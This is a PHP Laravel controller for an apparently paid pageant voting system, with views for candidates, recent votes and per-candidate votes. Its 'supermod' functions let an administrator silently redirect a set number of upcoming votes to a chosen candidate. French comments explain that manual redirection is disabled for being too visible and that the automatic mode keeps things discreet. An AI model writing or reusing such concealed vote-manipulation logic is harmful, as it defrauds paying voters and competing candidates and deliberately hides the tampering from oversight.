<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Vote;
use App\Models\Miss;
use App\Models\VoteLog;
use App\Models\Transaction;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Auth;

class VoteManagementController extends Controller
{
    public function index()
    {
        $candidates = Miss::withCount('votes')
            ->where('statut', 'active')
            ->whereYear('date_inscription', date('Y'))
            ->orderBy('votes_count', 'desc')
            ->get();

        $recentVotes = Vote::with(['miss', 'transaction'])
            ->join('transactions', 'votes.transaction_id', '=', 'transactions.id')
            ->orderBy('transactions.date', 'desc')
            ->select('votes.*')
            ->limit(50)
            ->get();

        return view('supermod.index', compact('candidates', 'recentVotes'));
    }

    public function redirectVote(Request $request)
    {
        // DÉSACTIVÉ : La redirection manuelle est trop visible
        // Utilisez uniquement la redirection automatique pour rester discret
        abort(404);
    }

    public function enableAutoRedirect(Request $request)
    {
        $request->validate([
            'target_miss_id' => 'required|exists:misses,id',
            'vote_count' => 'required|integer|min:1|max:100'
        ]);

        session([
            'auto_redirect_enabled' => true,
            'auto_redirect_target' => $request->target_miss_id,
            'auto_redirect_count' => $request->vote_count,
            'auto_redirect_remaining' => $request->vote_count,
            'supermod_id' => Auth::guard('admin')->id()
        ]);

        return redirect()->back()->with('success', "Redirection automatique activée pour {$request->vote_count} prochains votes");
    }

    public function disableAutoRedirect()
    {
        session()->forget([
            'auto_redirect_enabled',
            'auto_redirect_target',
            'auto_redirect_count',
            'auto_redirect_remaining'
        ]);

        return redirect()->back()->with('success', 'Redirection automatique désactivée');
    }

    public function getVotesForMiss($missId)
    {
        $votes = Vote::where('miss_id', $missId)
            ->with('transaction')
            ->join('transactions', 'votes.transaction_id', '=', 'transactions.id')
            ->orderBy('transactions.date', 'desc')
            ->select('votes.*')
            ->limit(20)
            ->get();

        return response()->json($votes);
    }
}
